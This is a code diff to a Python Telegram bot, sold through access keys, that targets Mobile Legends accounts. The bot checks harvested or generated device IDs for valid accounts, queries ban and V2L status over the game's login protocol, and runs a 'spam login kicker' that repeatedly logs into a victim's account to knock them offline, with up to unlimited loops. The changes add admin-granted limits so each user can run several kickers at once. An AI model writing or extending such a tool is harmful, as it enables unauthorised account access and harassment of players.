@@ -36,6 +36,9 @@ ADMIN_IDS = [8477982865]
 KEYS_FILE = "keys.json"
 USERS_FILE = "users.json"
 BANNED_FILE = "banned_accounts.txt"
+DEVICE_LIMITS_FILE = "device_limits.json"
+DEVICE_HISTORY_FILE = "device_history.json"
+LIFETIME_HISTORY_FILE = "lifetime_history.json"
 
 LOGIN_HOST = os.environ.get('MLBB_LOGIN_HOST', 'login.ml.youngjoygame.com')
 LOGIN_PORT = int(os.environ.get('MLBB_LOGIN_PORT', 30021))
@@ -173,15 +176,22 @@ def is_banned_status(ban_status) -> bool:
     return 'ban' in str(ban_status).lower()
 
 
+def fmt_duration(seconds: float) -> str:
+    seconds = int(seconds)
+    if seconds < 60:
+        return f"{seconds}s"
+    if seconds < 3600:
+        return f"{seconds // 60}m {seconds % 60}s"
+    if seconds < 86400:
+        return f"{seconds // 3600}h {(seconds % 3600) // 60}m"
+    return f"{seconds // 86400}d {(seconds % 86400) // 3600}h"
+
+
 # ────────────────────────────────────────────────────────────────
 # V2L DETECTION
 # ────────────────────────────────────────────────────────────────
 
 async def _get_v2l_status(reader, writer, acc, zone) -> str:
-    """
-    Query V2L status using packets 10208, 10145, 10143.
-    Returns "Enabled", "Disabled", or "N/A".
-    """
     try:
         writer.write(_frame(10208, 4, SDP({0: int(acc), 1: int(zone)}).data))
         await asyncio.wait_for(writer.drain(), timeout=1.0)
@@ -373,7 +383,6 @@ def extract_player_data(result, created_ts=None, v2l_status="N/A") -> Optional[d
         except Exception:
             pass
 
-        # Created-at timestamp: prefer tag 42, fall back to creation_ts from login
         created_raw = pd.get(42) or created_ts
         created_at_str = fmt_created_at(created_raw)
 
@@ -487,7 +496,6 @@ class LiveStats:
         self.v2l_inactive = 0
 
     def add_hit(self, res: dict):
-        """Register a NON-banned valid account."""
         self.total_hits += 1
         player = res.get('player')
         if not player:
@@ -539,7 +547,6 @@ class LiveStats:
             self.rank_mythic += 1
 
     def add_banned(self, res: dict):
-        """Register a banned account."""
         self.total_hits += 1
         self.banned += 1
         if res.get('player'):
@@ -578,6 +585,9 @@ class KeyManager:
     def __init__(self):
         self.keys = self._load(KEYS_FILE)
         self.users = self._load(USERS_FILE)
+        self.device_limits = self._load(DEVICE_LIMITS_FILE)
+        self.device_history = self._load(DEVICE_HISTORY_FILE)
+        self.lifetime_history = self._load(LIFETIME_HISTORY_FILE)
 
     def _load(self, path: str) -> dict:
         try:
@@ -601,6 +611,27 @@ class KeyManager:
                 json.dump(self.users, f, indent=2)
         except Exception as e:
             logger.error(f"Save users error: {e}")
+
+    def _save_device_limits(self):
+        try:
+            with open(DEVICE_LIMITS_FILE, 'w') as f:
+                json.dump(self.device_limits, f, indent=2)
+        except Exception as e:
+            logger.error(f"Save device limits error: {e}")
+
+    def _save_device_history(self):
+        try:
+            with open(DEVICE_HISTORY_FILE, 'w') as f:
+                json.dump(self.device_history, f, indent=2)
+        except Exception as e:
+            logger.error(f"Save device history error: {e}")
+
+    def _save_lifetime_history(self):
+        try:
+            with open(LIFETIME_HISTORY_FILE, 'w') as f:
+                json.dump(self.lifetime_history, f, indent=2)
+        except Exception as e:
+            logger.error(f"Save lifetime history error: {e}")
 
     def generate_key(self, duration_seconds: int, label: str, created_by: int) -> str:
         key = "MLBB-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))
@@ -690,6 +721,94 @@ class KeyManager:
             self._save_keys()
             return True
         return False
+
+    # ── CONCURRENT DEVICE LIMIT MANAGEMENT ──
+
+    def get_device_limit(self, user_id: int) -> int:
+        """Max CONCURRENT devices a user can kick at once."""
+        uid = str(user_id)
+        try:
+            return int(self.device_limits.get(uid, 1))
+        except Exception:
+            return 1
+
+    def set_device_limit(self, user_id: int, limit: int) -> bool:
+        uid = str(user_id)
+        self.device_limits[uid] = max(1, int(limit))
+        self._save_device_limits()
+        return True
+
+    def add_device_limit(self, user_id: int, amount: int) -> int:
+        uid = str(user_id)
+        current = self.get_device_limit(user_id)
+        new_limit = max(1, current + int(amount))
+        self.device_limits[uid] = new_limit
+        self._save_device_limits()
+        return new_limit
+
+    def reset_device_limit(self, user_id: int) -> bool:
+        uid = str(user_id)
+        self.device_limits[uid] = 1
+        self._save_device_limits()
+        if uid in self.device_history:
+            del self.device_history[uid]
+            self._save_device_history()
+        return True
+
+    def get_user_devices(self, user_id: int) -> list:
+        """Currently ACTIVE devices (running kickers)."""
+        uid = str(user_id)
+        return self.device_history.get(uid, [])
+
+    def add_user_device(self, user_id: int, device_id: str) -> bool:
+        """Mark a device as currently active."""
+        uid = str(user_id)
+        if uid not in self.device_history:
+            self.device_history[uid] = []
+        if device_id not in self.device_history[uid]:
+            self.device_history[uid].append(device_id)
+            self._save_device_history()
+        return True
+
+    def remove_user_device(self, user_id: int, device_id: str) -> bool:
+        """Remove a device from active list (frees up a slot)."""
+        uid = str(user_id)
+        if uid in self.device_history and device_id in self.device_history[uid]:
+            self.device_history[uid].remove(device_id)
+            if not self.device_history[uid]:
+                del self.device_history[uid]
+            self._save_device_history()
+            return True
+        return False
+
+    def get_device_count(self, user_id: int) -> int:
+        """Number of currently ACTIVE devices."""
+        uid = str(user_id)
+        return len(self.device_history.get(uid, []))
+
+    def list_device_limits(self) -> List[dict]:
+        result = []
+        for uid, limit in self.device_limits.items():
+            result.append({
+                "uid": uid,
+                "limit": int(limit),
+                "used": self.get_device_count(int(uid)),
+            })
+        return result
+
+    # ── LIFETIME HISTORY (admin reference only) ──
+
+    def get_lifetime_devices(self, user_id: int) -> list:
+        uid = str(user_id)
+        return self.lifetime_history.get(uid, [])
+
+    def add_lifetime_device(self, user_id: int, device_id: str):
+        uid = str(user_id)
+        if uid not in self.lifetime_history:
+            self.lifetime_history[uid] = []
+        if device_id not in self.lifetime_history[uid]:
+            self.lifetime_history[uid].append(device_id)
+            self._save_lifetime_history()
 
 
 def parse_duration(text: str) -> Tuple[Optional[int], Optional[str]]:
@@ -1098,11 +1217,7 @@ async def _check(did: str, sem: asyncio.Semaphore, bucket: _Bucket) -> Optional[
                             break
                     if authed:
                         ban_status = await _check_ban_on_conn(gr, gw)
-
-                        # V2L status check
                         v2l_status = await _get_v2l_status(gr, gw, acc, zone)
-
-                        # Fetch player info
                         gw.write(_frame(11153, 3, SDP({1: int(acc)}).data))
                         await asyncio.wait_for(gw.drain(), timeout=1.0)
                         for _ in range(10):
@@ -1364,10 +1479,8 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
                         ban_status = "NORMAL"
                         break
 
-                # V2L status
                 v2l_status = _sync_get_v2l(sock2, acc, zone)
 
-                # Player info
                 sock2.sendall(_frame(11153, 3, SDP({1: int(acc)}).data))
                 for _ in range(10):
                     res = _sync_recv_frame(sock2)
@@ -1397,7 +1510,7 @@ def fetch_session_profile(device_id: str) -> Optional[dict]:
             'gs_info': f"{gs_host}:{gs_port}",
             'ban_status': ban_status,
             'v2l_status': v2l_status,
-            'created_at': fmt_created_at(player_data.get('created_at_ts') if isinstance(player_data, dict) else creation_ts) if False else (player_data.get('created_at', 'N/A') if isinstance(player_data, dict) else fmt_created_at(creation_ts)),
+            'created_at': player_data.get('created_at', 'N/A') if isinstance(player_data, dict) else fmt_created_at(creation_ts),
             'nickname': player_data.get('nickname', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
             'level': player_data.get('level', 0) if isinstance(player_data, dict) else 0,
             'rank': player_data.get('current_rank', 'Unknown') if isinstance(player_data, dict) else 'Unknown',
@@ -1520,7 +1633,7 @@ async def run_kick_loop(profile: dict, total_loops: int, delay_sec: float,
 
         if progress_cb:
             try:
-                await progress_cb(count, success_count, fail_count, lat)
+                await progress_cb(count, success_count, fail_count, lat, desc)
             except Exception:
                 pass
 
@@ -1557,11 +1670,13 @@ class MLBBBot:
     def __init__(self):
         self.active_tasks = {}
         self.live_stats = {}
+        # Multi-device support: keyed by (user_id, device_id) tuple
         self.bf_profiles = {}
         self.bf_cancel_flags = {}
         self.bf_running = {}
         self.bf_tasks = {}
         self.bf_running_lock = asyncio.Lock()
+        self.bf_kick_logs = {}
 
     def _is_admin(self, user_id: int) -> bool:
         return user_id in ADMIN_IDS
@@ -1569,15 +1684,59 @@ class MLBBBot:
     def _check_access(self, user_id: int) -> bool:
         return key_manager.has_access(user_id)
 
-    def _bf_is_active(self, user_id: int) -> bool:
-        task = self.bf_tasks.get(user_id)
+    def _bf_is_active(self, user_id: int, device_id: str) -> bool:
+        """Check if a kicker is active for this specific (user, device) pair."""
+        key = (user_id, device_id)
+        task = self.bf_tasks.get(key)
         if task is None:
             return False
         if task.done():
-            self.bf_tasks.pop(user_id, None)
-            self.bf_running.pop(user_id, None)
+            self.bf_tasks.pop(key, None)
+            self.bf_running.pop(key, None)
             return False
         return True
+
+    def _bf_user_active_count(self, user_id: int) -> int:
+        """Count how many kickers this user currently has running."""
+        count = 0
+        for (uid, did), task in list(self.bf_tasks.items()):
+            if uid != user_id:
+                continue
+            if task and not task.done():
+                count += 1
+            else:
+                self.bf_tasks.pop((uid, did), None)
+                self.bf_running.pop((uid, did), None)
+        return count
+
+    def _bf_user_active_devices(self, user_id: int) -> list:
+        """Get list of device IDs the user is currently kicking."""
+        devices = []
+        for (uid, did), task in list(self.bf_tasks.items()):
+            if uid != user_id:
+                continue
+            if task and not task.done():
+                devices.append(did)
+            else:
+                self.bf_tasks.pop((uid, did), None)
+                self.bf_running.pop((uid, did), None)
+        return devices
+
+    def _count_active_kickers(self) -> int:
+        """Count all active kickers globally."""
+        count = 0
+        for key, task in list(self.bf_tasks.items()):
+            if task and not task.done() and key in self.bf_running:
+                count += 1
+            else:
+                if task and task.done():
+                    self.bf_tasks.pop(key, None)
+                    self.bf_running.pop(key, None)
+        return count
+
+    # ────────────────────────────────────────────────────────────────
+    # START / MENU
+    # ────────────────────────────────────────────────────────────────
 
     async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
@@ -1601,6 +1760,7 @@ class MLBBBot:
             keyboard.append([InlineKeyboardButton("📁 Check from File", callback_data="check_file")])
             keyboard.append([InlineKeyboardButton("🎲 Generate & Check", callback_data="generate")])
             keyboard.append([InlineKeyboardButton("⚡ BruteForce", callback_data="bf_help")])
+            keyboard.append([InlineKeyboardButton("📱 My Devices", callback_data="my_devices")])
         if not has_access and not is_admin:
             welcome_msg += "You need an access key to use this bot.\nUse /redeem <KEY> to activate."
         if is_admin:
@@ -1700,8 +1860,9 @@ class MLBBBot:
             "/start — Main menu\n"
             "/redeem <KEY> — Activate key\n"
             "/bf <device_id> — Brute Force / Spam Login Kicker\n"
-            "/bfstatus — Show current kicker status\n"
-            "/stop_bf — Stop active kicker\n"
+            "/bfstatus — Show all your kickers\n"
+            "/stop_bf — Stop ALL your kickers\n"
+            "/mydevices — Show active devices & limit\n"
             "/help — Show this\n"
         )
         if is_admin:
@@ -1712,8 +1873,226 @@ class MLBBBot:
                 "/listusers — All users\n"
                 "/revoke <uid> — Revoke access\n"
                 "/delkey <KEY> — Delete key\n"
+                "/setdevlimit <uid> <n> — Set concurrent limit\n"
+                "/adddevlimit <uid> <n> — Add to concurrent limit\n"
+                "/checkdevlimit <uid> — Check user's limit\n"
+                "/resetdevlimit <uid> — Reset user's limit\n"
+                "/listdevlimits — List all custom limits\n"
+                "/activekickers — Show all active kickers\n"
             )
         await update.message.reply_text(help_text)
+
+    # ────────────────────────────────────────────────────────────────
+    # ADMIN DEVICE LIMIT COMMANDS
+    # ────────────────────────────────────────────────────────────────
+
+    async def setdevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not self._is_admin(update.effective_user.id):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        if len(context.args) < 2:
+            await update.message.reply_text(
+                "Usage: /setdevlimit <user_id> <limit>\n\n"
+                "Sets the MAX CONCURRENT devices for a user.\n\n"
+                "Examples:\n"
+                "/setdevlimit 123456789 5 — Allow 5 concurrent\n"
+                "/setdevlimit 123456789 1 — Reset to 1"
+            )
+            return
+        try:
+            target_uid = int(context.args[0])
+            limit = int(context.args[1])
+        except ValueError:
+            await update.message.reply_text("❌ Invalid user ID or limit. Must be numbers.")
+            return
+        if limit < 1:
+            await update.message.reply_text("❌ Limit must be at least 1.")
+            return
+        key_manager.set_device_limit(target_uid, limit)
+        await update.message.reply_text(
+            f"✅ Concurrent device limit set!\n\n"
+            f"User: {target_uid}\n"
+            f"Max Concurrent: {limit}\n\n"
+            f"User can now run up to {limit} kicker(s) simultaneously."
+        )
+
+    async def adddevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not self._is_admin(update.effective_user.id):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        if len(context.args) < 2:
+            await update.message.reply_text(
+                "Usage: /adddevlimit <user_id> <amount>\n\n"
+                "Examples:\n"
+                "/adddevlimit 123456789 2 — Add 2 more slots\n"
+                "/adddevlimit 123456789 5 — Add 5 more slots"
+            )
+            return
+        try:
+            target_uid = int(context.args[0])
+            amount = int(context.args[1])
+        except ValueError:
+            await update.message.reply_text("❌ Invalid user ID or amount. Must be numbers.")
+            return
+        if amount < 1:
+            await update.message.reply_text("❌ Amount must be at least 1.")
+            return
+        new_limit = key_manager.add_device_limit(target_uid, amount)
+        await update.message.reply_text(
+            f"✅ Concurrent device limit increased!\n\n"
+            f"User: {target_uid}\n"
+            f"Added: +{amount}\n"
+            f"New Max Concurrent: {new_limit}"
+        )
+
+    async def checkdevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not self._is_admin(update.effective_user.id):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        if not context.args:
+            await update.message.reply_text("Usage: /checkdevlimit <user_id>")
+            return
+        try:
+            target_uid = int(context.args[0])
+        except ValueError:
+            await update.message.reply_text("❌ Invalid user ID.")
+            return
+        limit = key_manager.get_device_limit(target_uid)
+        active = key_manager.get_user_devices(target_uid)
+        lifetime = key_manager.get_lifetime_devices(target_uid)
+
+        active_list = "\n".join(f"  • {d[:50]}..." for d in active[:10]) if active else "  None"
+        lifetime_list = "\n".join(f"  • {d[:50]}..." for d in lifetime[:10]) if lifetime else "  None"
+
+        await update.message.reply_text(
+            f"📋 Device Limit Info\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"User: {target_uid}\n"
+            f"Max Concurrent: {limit}\n"
+            f"Active Now: {len(active)}\n\n"
+            f"🟢 Active Devices:\n{active_list}\n\n"
+            f"📜 Lifetime History ({len(lifetime)}):\n{lifetime_list}"
+        )
+
+    async def resetdevlimit_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not self._is_admin(update.effective_user.id):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        if not context.args:
+            await update.message.reply_text("Usage: /resetdevlimit <user_id>")
+            return
+        try:
+            target_uid = int(context.args[0])
+        except ValueError:
+            await update.message.reply_text("❌ Invalid user ID.")
+            return
+        key_manager.reset_device_limit(target_uid)
+        await update.message.reply_text(
+            f"✅ Reset complete!\n\n"
+            f"User: {target_uid}\n"
+            f"Concurrent limit reset to: 1\n"
+            f"Active device list cleared."
+        )
+
+    async def listdevlimits_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not self._is_admin(update.effective_user.id):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        limits = key_manager.list_device_limits()
+        if not limits:
+            await update.message.reply_text("No custom device limits set. All users default to 1.")
+            return
+        lines = ["📋 Device Limits\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
+        for item in sorted(limits, key=lambda x: x['limit'], reverse=True):
+            lines.append(
+                f"👤 {item['uid']} — Limit: {item['limit']} | Active: {item['used']}"
+            )
+        await update.message.reply_text("\n".join(lines[:30]))
+
+    async def activekickers_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        if not self._is_admin(update.effective_user.id):
+            await update.message.reply_text("❌ Admin only.")
+            return
+        active = []
+        for (uid, did), task in list(self.bf_tasks.items()):
+            if task and not task.done():
+                st = self.bf_running.get((uid, did))
+                if st:
+                    elapsed = time.time() - st['started_at']
+                    profile = st.get('profile', {})
+                    active.append({
+                        'uid': uid,
+                        'device_id': did,
+                        'nickname': profile.get('nickname', 'Unknown'),
+                        'account': profile.get('account_id', '?'),
+                        'count': st['count'],
+                        'success': st['success'],
+                        'failed': st['failed'],
+                        'elapsed': elapsed,
+                        'total': st['total_loops'],
+                        'last_latency': st.get('last_latency', 0),
+                        'last_status': st.get('last_status', 'N/A'),
+                    })
+            else:
+                self.bf_tasks.pop((uid, did), None)
+                self.bf_running.pop((uid, did), None)
+
+        if not active:
+            await update.message.reply_text(
+                "📊 Active Kickers\n"
+                "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                "🟢 No active kickers running."
+            )
+            return
+
+        lines = [f"📊 Active Kickers ({len(active)})\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
+        for i, k in enumerate(active, 1):
+            loop_str = f"{k['count']}/{k['total']}" if k['total'] > 0 else f"{k['count']}/∞"
+            speed = k['count'] / k['elapsed'] if k['elapsed'] > 0 else 0
+            lines.append(
+                f"{i}. 👤 {k['nickname']} (ID: {k['account']})\n"
+                f"   User: {k['uid']}\n"
+                f"   Device: ...{k['device_id'][-8:]}\n"
+                f"   Loop: {loop_str} | Speed: {speed:.1f}/s\n"
+                f"   ✅ {k['success']} | ❌ {k['failed']}\n"
+                f"   ⚡ {k['last_latency']:.0f}ms\n"
+                f"   📡 {k['last_status']}\n"
+                f"   ⏱ {int(k['elapsed'] // 60)}m {int(k['elapsed'] % 60)}s\n"
+            )
+        await update.message.reply_text("\n".join(lines))
+
+    # ────────────────────────────────────────────────────────────────
+    # USER DEVICES COMMAND
+    # ────────────────────────────────────────────────────────────────
+
+    async def mydevices_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        user_id = update.effective_user.id
+        max_devices = key_manager.get_device_limit(user_id)
+        active_devices = key_manager.get_user_devices(user_id)
+        lifetime_devices = key_manager.get_lifetime_devices(user_id)
+        active_count = self._bf_user_active_count(user_id)
+
+        if not active_devices:
+            active_list = "  No active devices."
+        else:
+            active_list = "\n".join(
+                f"  {i}. {d[:60]}..." if len(d) > 60 else f"  {i}. {d}"
+                for i, d in enumerate(active_devices, 1)
+            )
+
+        await update.message.reply_text(
+            f"📱 My Bruteforce Devices\n"
+            f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"Concurrent Limit: {len(active_devices)}/{max_devices}\n"
+            f"Remaining Slots: {max(0, max_devices - len(active_devices))}\n"
+            f"⚡ Active Kickers: {active_count}\n\n"
+            f"Active Devices:\n{active_list}\n\n"
+            f"📜 Lifetime History: {len(lifetime_devices)} device(s)"
+        )
+
+    # ────────────────────────────────────────────────────────────────
+    # CHECK FILE / GENERATE
+    # ────────────────────────────────────────────────────────────────
 
     async def check_file(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
@@ -1746,6 +2125,9 @@ class MLBBBot:
         is_admin = self._is_admin(user_id)
         expiry = key_manager.get_expiry(user_id)
         has_access = self._check_access(user_id)
+        max_devices = key_manager.get_device_limit(user_id)
+        active_devices = key_manager.get_device_count(user_id)
+        active_count = self._bf_user_active_count(user_id)
         if is_admin:
             status = "Role: Admin (Unlimited)"
         elif has_access:
@@ -1753,8 +2135,16 @@ class MLBBBot:
         else:
             status = "No access\n/redeem <KEY>"
         await query.edit_message_text(
-            f"📋 My Status\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\nID: {user_id}\n{status}"
+            f"📋 My Status\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+            f"ID: {user_id}\n"
+            f"{status}\n\n"
+            f"📱 Concurrent Limit: {active_devices}/{max_devices}\n"
+            f"⚡ Active Kickers: {active_count}"
         )
+
+    # ────────────────────────────────────────────────────────────────
+    # ADMIN PANEL
+    # ────────────────────────────────────────────────────────────────
 
     async def admin_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         query = update.callback_query
@@ -1765,16 +2155,24 @@ class MLBBBot:
         keys = key_manager.list_keys(show_used=False)
         users = key_manager.list_users()
         active_users = sum(1 for u in users if u["active"])
+        active_kickers = self._count_active_kickers()
         keyboard = [
             [InlineKeyboardButton("🔑 Generate Key", callback_data="admin_genkey")],
             [InlineKeyboardButton("📋 List Keys", callback_data="admin_listkeys")],
             [InlineKeyboardButton("👥 List Users", callback_data="admin_listusers")],
+            [InlineKeyboardButton("📱 Device Limits", callback_data="admin_devlimits")],
             [InlineKeyboardButton("◀ Back", callback_data="back_main")]
         ]
         await query.edit_message_text(
             f"🔑 Admin Panel\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
-            f"Unused Keys: {len(keys)}\nTotal Users: {len(users)}\nActive: {active_users}\n\n"
-            f"/genkey <dur> | /listkeys | /listusers\n/revoke <uid> | /delkey <key>",
+            f"Unused Keys: {len(keys)}\n"
+            f"Total Users: {len(users)}\n"
+            f"Active: {active_users}\n"
+            f"⚡ Active Kickers: {active_kickers}\n\n"
+            f"/genkey <dur> | /listkeys | /listusers\n"
+            f"/revoke <uid> | /delkey <key>\n"
+            f"/setdevlimit | /adddevlimit | /checkdevlimit\n"
+            f"/resetdevlimit | /listdevlimits | /activekickers",
             reply_markup=InlineKeyboardMarkup(keyboard)
         )
 
@@ -1843,17 +2241,37 @@ class MLBBBot:
         keyboard = [[InlineKeyboardButton("◀ Back", callback_data="admin_panel")]]
         await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
 
+    async def admin_devlimits_panel(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
+        query = update.callback_query
+        if not self._is_admin(query.from_user.id):
+            await query.answer("❌", show_alert=True)
+            return
+        await query.answer()
+        limits = key_manager.list_device_limits()
+        if not limits:
+            text = (
+                "📱 Device Limits\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                "No custom limits set.\nAll users default to 1.\n\n"
+                "Use /setdevlimit <uid> <n> to set."
+            )
+        else:
+            lines = ["📱 Device Limits\n━━━━━━━━━━━━━━━━━━━━━━━━━━━\n"]
+            for item in sorted(limits, key=lambda x: x['limit'], reverse=True)[:15]:
+                lines.append(
+                    f"👤 {item['uid']} — {item['limit']} (active {item['used']})"
+                )
+            text = "\n".join(lines)
+        keyboard = [[InlineKeyboardButton("◀ Back", callback_data="admin_panel")]]
+        await query.edit_message_text(text, reply_markup=InlineKeyboardMarkup(keyboard))
+
+    # ────────────────────────────────────────────────────────────────
+    # BRUTE FORCE COMMANDS
+    # ────────────────────────────────────────────────────────────────
+
     async def bf_cmd(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
         user_id = update.effective_user.id
         if not self._check_access(user_id):
             await update.message.reply_text("❌ No access. Use /redeem <KEY>")
-            return
-
-        if self._bf_is_active(user_id):
-            await update.message.reply_text(
-                "⚠️ You already have a kicker running!\n"
-                "Use /bfstatus to check it or /stop_bf to stop it first."
-            )
             return
 
         if not context.args:
@@ -1862,13 +2280,42 @@ class MLBBBot:
                 "━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                 "Usage: /bf <device_id>\n"
                 "Example: /bf and_abc123def456...\n\n"
-                "This will verify the device ID and let you spam-kick the session."
+                "You can run MULTIPLE kickers at once, up to your "
+                "concurrent device limit.\n\n"
+                "Use /mydevices to check your limit."
             )
             return
 
         device_id = context.args[0].strip()
         if len(device_id) < 40:
             await update.message.reply_text("❌ Device ID too short. Must be at least 40 chars.")
+            return
+
+        # Check if THIS specific device is already running
+        if self._bf_is_active(user_id, device_id):
+            await update.message.reply_text(
+                "⚠️ You already have a kicker running for this device!\n"
+                "Use /bfstatus to check it or /stop_bf to stop it first."
+            )
+            return
+
+        # ── CHECK CONCURRENT DEVICE LIMIT ──
+        max_devices = key_manager.get_device_limit(user_id)
+        running_count = self._bf_user_active_count(user_id)
+
+        if running_count >= max_devices:
+            running_devices = self._bf_user_active_devices(user_id)
+            devices_display = "\n".join(
+                f"  • {d[:50]}..." for d in running_devices[:5]
+            )
+            await update.message.reply_text(
+                f"⚠️ Concurrent Limit Reached!\n"
+                f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
+                f"Your limit: {max_devices} concurrent device(s)\n"
+                f"Currently active: {running_count}\n\n"
+                f"Active devices:\n{devices_display}\n\n"
+                f"Stop a kicker with /stop_bf to free up a slot."
+            )
             return
 
         status_msg = await update.message.reply_text(
@@ -1892,7 +2339,12 @@ class MLBBBot:
             )
             return
 
-        self.bf_profiles[user_id] = profile
+        # Register device as ACTIVE (freed when kicker stops) + LIFETIME (for admin ref)
+        key_manager.add_user_device(user_id, device_id)
+        key_manager.add_lifetime_device(user_id, device_id)
+        logger.info(f"Registered device for user {user_id}: {device_id[:30]}...")
+
+        self.bf_profiles[(user_id, device_id)] = profile
 
         if is_banned_status(profile.get('ban_status')):
             ban_line = f"🚫 Status      : {profile['ban_status']}\n"
@@ -1913,17 +2365,22 @@ class MLBBBot:
             f"🔐 V2L Status  : {profile.get('v2l_status', 'N/A')}\n"
             f"📅 Created     : {profile.get('created_at', 'N/A')}\n"
             f"{ban_line}"
+            f"⚡ Active      : {running_count + 1}/{max_devices}\n"
         )
 
+        dev_short = device_id[-8:]
         keyboard = [
-            [InlineKeyboardButton("🧪 Single Test", callback_data="bf_mode_single")],
-            [InlineKeyboardButton("⚡ 10x Kick", callback_data="bf_mode_10")],
-            [InlineKeyboardButton("🚀 50x Kick", callback_data="bf_mode_50")],
-            [InlineKeyboardButton("💥 100x Kick", callback_data="bf_mode_100")],
-            [InlineKeyboardButton("♾️ Unlimited (until stop)", callback_data="bf_mode_inf")],
-            [InlineKeyboardButton("🛠️ Custom", callback_data="bf_mode_custom")],
-            [InlineKeyboardButton("🛑 Stop", callback_data="bf_stop")],
+            [InlineKeyboardButton("🧪 Single Test", callback_data=f"bf_s|{dev_short}")],
+            [InlineKeyboardButton("⚡ 10x Kick", callback_data=f"bf_10|{dev_short}")],
+            [InlineKeyboardButton("🚀 50x Kick", callback_data=f"bf_50|{dev_short}")],
+            [InlineKeyboardButton("💥 100x Kick", callback_data=f"bf_100|{dev_short}")],
+            [InlineKeyboardButton("♾️ Unlimited (until stop)", callback_data=f"bf_inf|{dev_short}")],
+            [InlineKeyboardButton("🛠️ Custom", callback_data=f"bf_cus|{dev_short}")],
+            [InlineKeyboardButton("🛑 Stop", callback_data=f"bf_stp|{dev_short}")],
         ]
+
+        context.user_data['bf_device_map'] = context.user_data.get('bf_device_map', {})
+        context.user_data['bf_device_map'][dev_short] = device_id
 
         try:
             await status_msg.edit_text(
@@ -1935,12 +2392,12 @@ class MLBBBot:
             await update.message.reply_text(profile_text, reply_markup=InlineKeyboardMarkup(keyboard))
 
     async def bf_start_kick(self, update: Update, context: ContextTypes.DEFAULT_TYPE,
-                            total_loops: int, delay_sec: float):
+                            total_loops: int, delay_sec: float, device_id: str):
         query = update.callback_query
         user_id = query.from_user.id
         await query.answer()
 
-        profile = self.bf_profiles.get(user_id)
+        profile = self.bf_profiles.get((user_id, device_id))
         if not profile:
             try:
                 await query.edit_message_text("❌ Session expired. Use /bf <device_id> again.")
@@ -1948,15 +2405,17 @@ class MLBBBot:
                 pass
             return
 
+        key = (user_id, device_id)
+
         async with self.bf_running_lock:
-            if self._bf_is_active(user_id):
+            if self._bf_is_active(user_id, device_id):
                 try:
-                    await query.answer("⚠️ Kicker already running! Use /stop_bf or /bfstatus.", show_alert=True)
+                    await query.answer("⚠️ Kicker already running for this device! Use /stop_bf.", show_alert=True)
                 except Exception:
                     pass
                 return
-            self.bf_cancel_flags[user_id] = False
-            self.bf_running[user_id] = {
+            self.bf_cancel_flags[key] = False
+            self.bf_running[key] = {
                 'started_at': time.time(),
                 'total_loops': total_loops,
                 'delay': delay_sec,
@@ -1967,11 +2426,15 @@ class MLBBBot:
                 'last_update': 0.0,
                 'status': 'active',
                 'profile': profile,
+                'last_status': 'Initializing...',
+                'device_id': device_id,
+                'user_id': user_id,
             }
         cancel_flag = self.bf_cancel_flags
 
         loop_label = f"{total_loops:,} loops" if total_loops > 0 else "♾️ Unlimited"
-        keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data="bf_stop")]]
+        dev_short = device_id[-8:]
+        keyboard = [[InlineKeyboardButton("🛑 STOP", callback_data=f"bf_stp|{dev_short}")]]
         try:
             await query.edit_message_text(
                 f"⚡ Kicker Active ({loop_label} | Delay {delay_sec}s)\n"
@@ -1988,28 +2451,33 @@ class MLBBBot:
         async def _runner():
             last_edit = [0.0]
 
-            async def progress_cb(count, success_count, fail_count, lat):
-                st = self.bf_running.get(user_id)
+            async def progress_cb(count, success_count, fail_count, lat, desc):
+                st = self.bf_running.get(key)
                 if st is not None:
                     st['count'] = count
                     st['success'] = success_count
                     st['failed'] = fail_count
                     st['last_latency'] = lat
                     st['last_update'] = time.time()
+                    st['last_status'] = desc
 
                 now = time.time()
                 if now - last_edit[0] < 2.0:
                     return
                 last_edit[0] = now
                 loop_str = f"{count}/{total_loops}" if total_loops > 0 else f"{count}/∞"
+                speed = count / (now - st['started_at']) if st and (now - st['started_at']) > 0 else 0
+                succ_pct = (success_count / count * 100) if count > 0 else 0
                 text = (
                     f"⚡ Kicker Active\n"
                     f"━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
                     f"👤 {profile['nickname']} (ID: {profile['account_id']})\n"
                     f"🔄 Loop: {loop_str}\n"
-                    f"✅ Success: {success_count}\n"
+                    f"✅ Success: {success_count} ({succ_pct:.1f}%)\n"
                     f"❌ Failed: {fail_count}\n"
-                    f"⚡ Last latency: {lat:.0f}ms\n\n"
